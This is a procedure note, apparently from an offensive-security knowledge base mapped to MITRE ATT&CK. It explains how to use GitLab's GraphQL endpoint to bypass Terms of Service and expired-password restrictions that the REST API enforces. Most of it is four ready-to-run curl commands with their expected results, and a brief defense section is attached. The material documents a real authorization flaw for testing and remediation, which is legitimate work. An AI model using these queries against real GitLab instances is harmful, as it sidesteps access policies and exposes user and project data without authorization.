---
tags:
  - tos-bypass
  - expired-password
  - additional-vulns
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Defense Evasion]]'
commands:
  - '[[commands/curl-graphql-tos-bypass-query]]'
  - '[[commands/curl-rest-tos-block]]'
  - '[[commands/curl-graphql-expiredpw-projects-query]]'
  - '[[commands/curl-rest-expiredpw-block]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:25:59.501Z'
sub_techniques: []
id: 58d082fa-bc06-4bf7-bec9-cfec3413de96
validated: true
mitre_tactics:
  - '[[Defense Evasion]]'
mitre_techniques:
  - '[[Valid Accounts]]'
  - '[[Exploit Public-Facing Application]]'
---
# Bypass-Additional-Restrictions-via-GraphQL

## Summary

This procedure exploits GraphQL to bypass Terms of Service non-acceptance and expired password restrictions, allowing API access where REST blocks it.

## Description

Similar to deactivation, GraphQL requires only :log_in, ignoring :access_api blocks for ToS or expired passwords. Users can query user data and projects; impacts include undermining legal terms and security policies.

## Requirements

1. Token from restricted user (ToS declined or password expired)
2. GitLab instance with these policies
3. curl

## Defense

Defensive measures and detection strategies:

- Align GraphQL auth with REST policies
- Force ToS acceptance via API
- Monitor for expired password access attempts

## Objectives

1. Access data without ToS acceptance
2. Query with expired password
3. Confirm multi-restriction bypass

## Instructions

### Step 1: ToS Bypass Query

**Context**: Query user data with ToS-declined token.

**Command** ([[commands/curl-graphql-tos-bypass-query]]):
```bash
curl 'https://gitlab.domain.com/api/graphql' -H 'Content-Type: application/json' -H 'Authorization: Bearer <TOKEN>' --data '{"query":"query {\n currentUser {\n id\n username\n name\n }\n}\n"}'
```

> Returns user details.

### Step 2: ToS REST Block

**Context**: Confirm REST enforcement.

**Command** ([[commands/curl-rest-tos-block]]):
```bash
curl --header "Authorization: Bearer <TOKEN>" "https://gitlab.domain.com/api/v4/user"
```

> 403 with ToS message.

### Step 3: Expired Password GraphQL Query

**Context**: List projects with expired PW token.

**Command** ([[commands/curl-graphql-expiredpw-projects-query]]):
```bash
curl --request POST --url https://gitlab.domain.com/api/graphql --header 'Authorization: Bearer <TOKEN>' --header 'Content-Type: application/json' --data '{"query":"query {\n projects{\n nodes{\n id\n name\n }\n }\n}"}'
```

> Lists projects.

### Step 4: Expired Password REST Block

**Context**: Verify REST block.

**Command** ([[commands/curl-rest-expiredpw-block]]):
```bash
curl --header "PRIVATE-TOKEN: <TOKEN>" "https://gitlab.domain.com/api/v4/projects"
```

> 403 with password expiration message.

## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion]] Defense Evasion

### Techniques

- [[Valid Accounts]] Valid Accounts
- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used

- [[commands/curl-graphql-tos-bypass-query]]
- [[commands/curl-rest-tos-block]]
- [[commands/curl-graphql-expiredpw-projects-query]]
- [[commands/curl-rest-expiredpw-block]]

## Tools Used

- [[tools/curl]]

## Tags

- tos
- expired-password
- bypass
